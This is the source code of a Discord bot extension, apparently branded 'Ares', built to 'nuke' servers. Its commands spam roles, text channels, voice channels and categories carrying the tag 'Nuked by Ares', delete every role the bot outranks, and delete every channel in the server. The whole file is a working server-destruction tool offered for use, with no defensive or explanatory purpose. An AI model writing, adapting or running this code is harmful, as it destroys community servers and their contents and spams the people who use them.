import logging
import os

import discord
from discord.ext import commands

# Cross platfrom terminal colors
red = "\033[31m"
green = "\033[32m"
cyan = "\033[36m"
purple = "\033[95m"
reset = "\033[0m"
bold = "\033[1m"
underline = "\033[4m"

class nukes(commands.Cog):
    """ All hail Ares, for he is the god that will win wars with sheer brutality."""
    def __init__(self, bot):
        self.bot = bot

    # Mass role creation
    @commands.command()
    async def rolecreate(self, ctx, *, role_name = "Nuked by Ares | vrc.gay/Ares"):
        """Mass role creation
        
        Paramaters
        • role_name - The name of the role you wish to create
        """
        logging.info("Starting mass role creation")
        logging.info("Using name: %s" % role_name)


        # Oooo so sexy and compact code
        for i in range(0, 24):
            try:
                await ctx.guild.create_role(name=role_name)
                logging.info("Created role: %s" % role_name) 
            except Exception as e:
                logging.error("Failed to create role")
                logging.error(e)
                break
    

    # Mass role deletion
    @commands.command()
    async def roledelete(self, ctx):
        """Mass role deletion"""
        logging.info("Starting role deletion")

        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.roles[-1] > role:
                try:
                    await role.delete()
                    logging.info("Deleted role: %s" % role)
                except Exception as e:
                    logging.error("Failed to delete role %s" % role)
                    logging.error(e)
                    break

    
    # Channels section
    
    # Spam channels
    @commands.command()
    async def channelcreate(self, ctx, *, channel_name="Nuked by Ares | vrc.gay/Ares"):
        """Spams channels ok cool

        Paramaters
        • channel_name - The name of the channels you wanna create
        """
        logging.info("Starting channel creation")
        for i in range(0, 24):
            # Create text chat
            try:
                await ctx.guild.create_text_channel(channel_name)
                logging.info("Created text channel %s" % channel_name)
            except Exception as e:
                logging.error("Failed to create channel %s" % channel_name)
                
                # Abort loop
                break
            
            # Create voice channel
            try:
                await ctx.guild.create_voice_channel(channel_name)
                logging.info("Created voice channel: %s" % channel_name)
            except Exception as e:
                logging.error("Failed to create voice chat: %s" % channel_name)
                logging.error("Error " + e)

                # Abort loop
                break
            
            # Create category
            try:
                await ctx.guild.create_category(channel_name)
                logging.info("Created category %s " % channel_name)
            except Exception as e:
                logging.error("Failed to create category %s " % channel_name)
                logging.error("Error: " + e)
                
                # Abort loop
                break

    # Delete channels
    @commands.command()
    async def channeldelete(self, ctx):
        """Deletes all the channels, voice channels and categories"""
        logging.info("Starting channel deletion")

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                logging.info("Deleted channel: %s " % channel)
            except Exception as e:
                logging.error("Could not delete channel: %s" % channel)
                logging.error("Error: " + e)
                break


def setup(bot):
    bot.add_cog(nukes(bot))
